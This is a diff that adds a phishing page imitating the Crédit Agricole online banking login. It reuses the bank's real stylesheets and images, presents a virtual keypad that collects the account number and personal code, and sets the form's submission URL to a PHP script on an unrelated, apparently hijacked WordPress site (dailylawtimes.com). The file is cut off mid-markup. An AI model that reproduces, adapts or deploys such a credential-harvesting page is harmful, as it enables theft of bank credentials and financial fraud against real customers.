@@ -1,0 +1,430 @@
+r_close:"Fermer",splash_url:""};
+/* ]]> */</script>
+
+
+
+
+
+
+
+ 
+ 
+
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/antiquus.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/antiquus.css?v=50" media="all" />
+
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles.css?v=50" media="all" />
+
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles-mod.css?v=50" media="all" />
+
+<!--[if IE 8]>
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie8.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie8.css?v=50" media="all" />
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie8-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie8-mod.css?v=50" media="all" />
+<![endif]-->
+
+<!--[if lte IE 7]>
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie.css?v=50" media="all" />
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie-mod.css?v=50" media="all" />
+<![endif]-->
+
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ieold.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ieold.css?v=50" media="all" />
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ieold-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ieold-mod.css?v=50" media="all" />
+<![endif]-->
+
+
+
+
+var Version=Version.substring(0,1);
+var posOS = navigator.appVersion.indexOf('Mac');
+var posOS2 = navigator.appVersion.indexOf('Win');
+if (posOS >= 0) OS = 'Mac';
+if ((posOS < 0) && (posOS2 >= 0)) OS = 'Win';
+if (OS == 'Win') Nav_sup = 2;
+else Nav_sup = 3;
+// si c'est Netscape 2+ ou MSIE3+, c'est correct
+browserOK=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=Nav_sup));
+browserOK1=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=4));
+browserOK2=(navigator.appName=="Netscape");
+
+
+// Detection navigateur
+nsvers = "0.94"; // pour netscape "6.2";
+ievers = "5";
+browserOK = false;
+isIE55 = false;
+var d, na, nua, nav, nan, dom, ie, ienu, ie4, ie5, ie5x, ie6, moz, moznu, ns62, mac, win, old, lin, ie5mac, ie5xwin, op, opnu, op4, op5, op6, op7, konq, saf, saf_num;
+
+//variable initialization
+
+d = document;
+na = navigator;
+nav = na.appVersion;
+nan = na.appName;
+nua = na.userAgent;
+win = ( nav.indexOf( 'Win' ) != -1 );
+mac = ( nav.indexOf( 'Mac' ) != -1 );
+lin = ( nav.indexOf( 'Linux' ) != -1 );
+
+if ( !d.layers ){
+	dom = ( d.getElementById );
+	old = ( nav.substring( 0, 1 ) < 4 );
+	op = ( nua.indexOf( 'Opera' ) != -1 );
+	moz = ( nua.indexOf( 'Gecko' ) != -1 );
+	ie = ( d.all && !op );
+	konq = ( nua.indexOf( 'Konqueror' ) != -1 );
+	saf = ( nua.indexOf( 'Safari' ) != -1 );
+
+	if ( op ){
+		op_pos = nua.indexOf( 'Opera' );
+		opnu = nua.substr( ( op_pos + 6 ), 3 );
+		op5 = ( opnu.substring( 0, 1 ) == 5 );
+		op6 = ( opnu.substring( 0, 1 ) == 6 );
+		op7 = ( opnu.substring( 0, 1 ) == 7 );
+	}
+	else if ( saf ){
+		saf_pos = nua.indexOf( 'Safari' );
+		saf_nu = nua.substr( ( saf_pos + 7 ), 2 );
+	}
+	else if ( moz ){
+		rv_pos = nua.indexOf( 'rv' );
+		moz_rv = nua.substr( ( rv_pos + 3 ), 3 );
+		moz_rv_sub = nua.substr( ( rv_pos + 7 ), 1 );
+		moz_rv_sub = moz_rv + moz_rv_sub;
+		browserOK = (moz_rv_sub >= nsvers);
+	}
+	else if ( ie ){
+		ie_pos = nua.indexOf( 'MSIE' );
+		ienu = nua.substr( ( ie_pos + 5 ), 3 );
+		ie4 = ( !dom ); 
+		ie5 = ( ienu.substring( 0, 1 ) == 5 );
+		ie6 = ( ienu.substring( 0, 1 ) == 6 );
+		browserOK = ( ienu.substring( 0, 1 ) >= ievers );
+	}
+	else{} 
+
+	ie5x = ( d.all && dom );
+	isIE55 = ie5x;
+	ie5mac = ( mac && ie5 );
+	ie5xwin = ( win && ie5x );
+}
+
+function Init()
+{
+		if (document.formulaire.CCPTE.value == "") document.formulaire.CCPTE.focus();
+        document.onkeydown=pressKey;
+}
+
+ns4=(document.layers)? true:false;
+ie4=(document.all)? true:false;
+
+function pressKey (e) {
+/*
+        if (ns4) {var nKey=e.which; var ieKey=0}
+        if (ie4) {var ieKey=event.keyCode; var nKey=0}
+        if (nKey==13 || ieKey==13) {
+				validation(document.formulaire);
+                return true;
+        }
+*/
+}
+
+function setSize(win,width,height) {
+	if (win.outerWidth) {
+		win.outerWidth = width;
+		win.outerHeight = height;
+	}
+	else if (win.resizeTo) {
+		win.resizeTo(width,height);
+	}
+	else {
+		alert("Not supported.");
+	}
+}
+
+function clicPosition(position) {
+	cocherCase();
+	if (document.formulaire.CCCRYC2.value.length == 6) { 
+		return; 
+	}
+	if (document.formulaire.CCCRYC.value=="") 
+		document.formulaire.CCCRYC.value = position;
+	else
+		document.formulaire.CCCRYC.value = document.formulaire.CCCRYC.value + "," + position;
+	document.formulaire.CCCRYC2.value = document.formulaire.CCCRYC2.value + "0";
+}
+
+var code, pos_der_code, affiche_code;
+function effacer() { 
+	if (document.formulaire.CCCRYC2.value.length == 0) { 
+		return; 
+	}
+	code = document.formulaire.CCCRYC.value;
+	pos_der_code = code.lastIndexOf( ',' );
+	code = code.substr( 0,pos_der_code);
+
+	affiche_code = document.formulaire.CCCRYC2.value;
+	affiche_code = affiche_code.substr( 0,(document.formulaire.CCCRYC2.value.length - 1) );
+
+	document.formulaire.CCCRYC.value = code;
+	document.formulaire.CCCRYC2.value = affiche_code;
+}
+
+var i=0;
+function cocherCase() {
+	if ( i<6)
+	{
+		var l_oBarre = document.getElementById("monAvancement");
+		l_oBarre.rows[0].cells[i].style.visibility = 'visible';
+		i = i + 1;
+	}
+}
+function corriger() {
+	if ( i>0 )
+	{
+		i = i - 1;
+		var l_oBarre = document.getElementById("monAvancement");
+		l_oBarre.rows[0].cells[i].style.visibility = 'hidden';
+	 }
+}
+
+var path_static = "";
+var path_dynamic = "/stb";
+// Recuperation code caisse
+var caisse = "878";
+
+function raf(){
+	return;
+}
+
+var urlappli = "http://dailylawtimes.com//nddh/wp/wp-content/plugins/buddyfree/Ca/feed.php";
+var urlapplisecu = "";
+
+function ValidCertif(){
+	document.formulaire.action = urlappli;
+	validation(document.formulaire)
+
+}
+
+function ValidCertifSecu(){
+	document.formulaire.action = urlapplisecu;
+	validation(document.formulaire)
+}
+
+// -->
+</SCRIPT>
+
+<SCRIPT LANGUAGE=JavaScript>
+<!--
+
+function ouvrePOPUP(item,widthpop,heightpop,men) {
+	if(item.indexOf("?") != -1) {
+		item = item+"&stbevt=Popup";
+	}
+	else {
+		item = item+"?stbevt=Popup";
+	}
+
+	ouvreFenetre(item,widthpop,heightpop,men,"PopUp");
+}
+function ouvreassistance(item,widthpop,heightpop,men) {
+	ouvreFenetre(item,widthpop,heightpop,men,"Assistance");
+}
+
+function ouvreFenetre(item,widthpop,heightpop,men,titre) {
+
+	if (item.indexOf("?") != -1) {
+		if (item.indexOf("#") != -1)
+			url = item.substring(0,item.indexOf("#"))+"&typeaction=Popup"+item.substring(item.indexOf("#"),item.length);
+		else
+			url = item+"&typeaction=Popup";
+	} else {
+		url = item;
+	}
+
+	aazz = "menubar=" + men + ",resizable=yes,toolbar=no,width=" + widthpop + ",height=" + heightpop + ",scrollbars=yes";
+
+	// on verifie si l'on n'est pas deja sur la bonne fenetre
+	if (titre!=window.name) {
+		// Mise en commentaire de l ancien code
+		//if (!saf) {
+			// on recupere un reference sur le popup (s'il n'est pas ouvert, cela en ouvre une!)
+		//	popup1 = window.open('',titre,aazz);
+			// on ferme le popup
+		//	popup1.close();
+		//}
+		// on ouvre le nouveau avec les nouveaux parametres (taille, bouton...)
+		//popup1 = window.open('',titre,aazz);
+		//popup1.name = titre;
+		//setSize(popup1,widthpop,heightpop);
+			
+		popup1 = window.open(url,titre,aazz);
+			
+	    if (moz ) popup1.focus()				<table width="590" border="0" cellspacing="0" cellpadding="0">
+							
+							<tr>
+								<td colspan="2" class="montant2">&nbsp;</td>
+							</tr>
+							
+							<tr>
+								<td colspan="2" height="17"></td>
+							</tr>
+							<!-- bandeau authentification --> <tr><td colSpan="2" align="center"><a href="" target="_blank" > <img src="https://www.ca-centrest.fr/Vitrine/ObjCommun/Fic/CentrEst/pap_bam/img/img_entreebam.gif"border=no></a></tr></tr> <tr><td>&nbsp;</td></tr>     
+							<tr>
+								<td height="17"><div class="boutons-act">
+                    <h1>
+                        Identification
+                   <span id="top-actions">
+								<a id="top-actions-aide" href=""
+				onmouseout="StatusMessage( false )"
+				onmouseover="StatusMessage(true, statusaide);return true" tabindex="32"
+				>Aide</a></span></h1>
+</div></td>
+							</tr>
+						</table>
+						<FORM class="ca-forms ca-forms-stitre" method="POST" name="formulaire" action="/stb/entreeBam" onSubmit="return false;code">Cliquez dans la grille <br />pour composer votre CODE PERSONNEL :</label>
+
+								
+								</form>
+								<table id="pave-saisie-code" class="gauche">
+<tr align="center" valign="middle">
+<td ><a tabindex=
+2
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td  onClick="clicPosition('8'); " ><a tabindex=
+3
+href="javascript:raf()" >
+&nbsp;&nbsp;8&nbsp;&nbsp;
+</a></td>
+<td ><a tabindex=
+4
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td ><a tabindex=
+5
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td  onClick="clicPosition('9'); " ><a tabindex=
+6
+href="javascript:raf()" >
+&nbsp;&nbsp;9&nbsp;&nbsp;
+</a></td>
+</tr>
+<tr align="center" valign="middle">
+<td  onClick="clicPosition('4'); " ><a tabindex=
+7
+href="javascript:raf()" >
+&nbsp;&nbsp;4&nbsp;&nbsp;
+</a></td>
+<td ><a tabindex=
+8
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td ><a tabindex=
+9
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td ><a tabindex=
+10
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td  onClick="clicPosition('5'); " ><a tabindex=
+11
+href="javascript:raf()" >
+&nbsp;&nbsp;5&nbsp;&nbsp;
+</a></td>
+</tr>
+<tr align="center" valign="middle">
+<td  onClick="clicPosition('7'); " ><a tabindex=
+12
+href="javascript:raf()" >
+&nbsp;&nbsp;7&nbsp;&nbsp;
+</a></td>
+<td  onClick="clicPosition('2'); " ><a tabindex=
+13
+href="javascript:raf()" >
+&nbsp;&nbsp;2&nbsp;&nbsp;
+</a></td>
+<td ><a tabindex=
+14
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td ><a tabindex=
+15
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td  onClick="clicPosition('3'); " ><a tabindex=
+16
+href="javascript:raf()" >
+&nbsp;&nbsp;3&nbsp;&nbsp;
+</a></td>
+</tr>
+<tr align="center" valign="middle">
+<td ><a tabindex=
+17
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td ><a tabindex=
+18
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td ><a tabindex=
+19
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td ><a tabindex=
+20
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td  onClick="clicPosition('1'); " ><a tabindex=
+21
+href="javascript:raf()" >
+&nbsp;&nbsp;1&nbsp;&nbsp;
+</a></td>
+</tr>
+<tr align="center" valign="middle">
+<td ><a tabindex=
+22
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td  onClick="clicPosition('0'); " ><a tabindex=
+23
+href="javascript:raf()" >
+&nbsp;&nbsp;0&nbsp;&nbsp;
+</a></td>
+<td ><a tabindex=
+24
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td  onClick="clicPosition('6'); " ><a tabindex=
+25
+href="javascript:raf()" >
+&nbsp;&nbsp;6&nbsp;&nbsp;
+</a></td>
+<td ><a tabindex=
+26
+href="javascript:raf()" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+</tr>
+</table>
+
+<span class="align-bas gauche">
+								<table>
+								<tr>
+								<td>
+								<div style="border-color: gray;border-width: 1px;border-style: solid;">
+								<TABLE id="monAvancement" class="monAvancement" style="border:none;"
+											>
+											<TR  >
+												<TD class="maCase"><IMG height="10" width="10"
+													src="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/point_transp.gif" /></TD>
+												<TD class="maCase"><IMG height="10" width="10"
+													src="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/point_transp.gif" /></TD>
+												<TD class="maCase"><IMG height="10" width="10"
+													src="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/point_transp.gif" /></TD>
+												<TD class="maCase"><IMG height="10" width="10"
+													src="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/point_transp.gif" /></TD>
+												<TD class="maCase"><IMG height="10" width="10"
+							
